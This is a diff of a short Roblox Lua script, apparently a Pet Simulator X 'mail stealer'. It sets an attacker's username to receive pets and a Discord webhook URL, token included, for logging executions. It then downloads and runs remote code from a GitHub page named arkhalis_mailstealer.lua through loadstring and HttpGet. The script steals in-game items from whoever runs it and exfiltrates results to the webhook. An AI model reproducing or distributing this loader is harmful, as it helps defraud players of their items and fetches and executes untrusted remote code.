@@ -1,1 +1,11 @@
-_G.Username1 = "yudipunggol27" --// Username To Send Pets To _G.Username2 = "yudipunggol27" --// Username To Send Pets To [OPTIONAL] --[[ WebHook ]]-- _G.Webhook = "https://discord.com/api/webhooks/1093092426039697531/_g6lbx3DNkI7aHk6ZFKPJv4RRl5hKoJAxRMnvQN2b6UsFwa_tSkbxKQFgb2DjnycPRe_" --// Discord Webhook For Executions --[[ Script ]]-- loadstring(game:HttpGet("https://raw.githubusercontent.com/98KRapid/psx/main/e",true))()
+Lua
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username1 = "Yudipunggol27" --// Username To Send Pets To
+_G.Username2 = "" --// Username To Send Pets To [OPTIONAL]
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1093092426039697531/_g6lbx3DNkI7aHk6ZFKPJv4RRl5hKoJAxRMnvQN2b6UsFwa_tSkbxKQFgb2DjnycPRe_" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
